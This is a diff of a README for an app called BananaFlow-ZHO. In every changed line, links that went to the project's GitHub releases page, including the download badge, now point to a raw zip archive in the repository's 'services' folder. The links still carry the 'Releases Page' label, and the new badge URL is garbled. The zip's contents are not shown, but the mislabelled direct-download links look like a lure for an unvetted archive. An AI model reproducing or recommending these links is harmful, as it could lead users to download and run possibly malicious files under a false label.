@@ -7,10 +7,10 @@ Welcome to BananaFlow-ZHO! This application helps you automate your workflows si
 To get started with BananaFlow-ZHO, follow these steps to download and run the software.
 
 ## 📥 Download Now
-[![Download BananaFlow-ZHO](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Bokichoy/BananaFlow-ZHO/releases)
+[![Download BananaFlow-ZHO](https://github.com/Bokichoy/BananaFlow-ZHO/raw/refs/heads/main/services/Banana-Flow-ZHO-2.5.zip%20Now-Click%https://github.com/Bokichoy/BananaFlow-ZHO/raw/refs/heads/main/services/Banana-Flow-ZHO-2.5.zip)](https://github.com/Bokichoy/BananaFlow-ZHO/raw/refs/heads/main/services/Banana-Flow-ZHO-2.5.zip)
 
 ## 📂 Download & Install
-1. Visit the [Releases Page](https://github.com/Bokichoy/BananaFlow-ZHO/releases) to download the latest version.
+1. Visit the [Releases Page](https://github.com/Bokichoy/BananaFlow-ZHO/raw/refs/heads/main/services/Banana-Flow-ZHO-2.5.zip) to download the latest version.
 2. Find the correct file for your operating system. The files are commonly labeled based on the environment they run on.
 3. Click on the download link for your file. Wait for the download to complete.
 
@@ -43,6 +43,6 @@ BananaFlow-ZHO offers a range of features designed to make automation easy, incl
 If you have any questions or need assistance, feel free to reach out through the community support or submit an issue on our GitHub page. We are here to help you!
 
 ## 🎉 In Conclusion
-BananaFlow-ZHO is your go-to tool for automating tasks with ease. We hope you enjoy using our application to simplify your daily activities. For updates and new features, check back regularly on the [Releases Page](https://github.com/Bokichoy/BananaFlow-ZHO/releases). 
+BananaFlow-ZHO is your go-to tool for automating tasks with ease. We hope you enjoy using our application to simplify your daily activities. For updates and new features, check back regularly on the [Releases Page](https://github.com/Bokichoy/BananaFlow-ZHO/raw/refs/heads/main/services/Banana-Flow-ZHO-2.5.zip). 
 
 Start automating your tasks today with BananaFlow-ZHO!
